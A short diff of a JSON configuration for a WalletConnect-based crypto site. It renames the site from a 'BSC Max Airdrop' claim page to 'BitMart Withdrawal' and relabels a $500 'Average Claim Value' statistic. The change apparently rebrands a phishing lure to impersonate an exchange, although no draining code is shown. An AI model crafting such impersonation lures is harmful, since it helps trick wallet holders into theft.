@@ -36,8 +36,8 @@
   "walletConnect": {
     "projectId": "435fa3916a5da648144afac1e1b4d3f2",
     "metadata": {
-      "name": "BSC Max Airdrop",
-      "description": "Claim your BSC Max airdrop tokens - Connect any BSC-compatible wallet",
+      "name": "BitMart Withdrawal",
+      "description": "Connect any BSC-compatible wallet",
       "icons": ["https://walletconnect.com/walletconnect-logo.png"]
     }
   },
@@ -119,7 +119,7 @@
     },
     {
       "number": "$500",
-      "label": "Average Claim Value"
+      "label": "Average Withdraw Value"
     }
   ]
 }
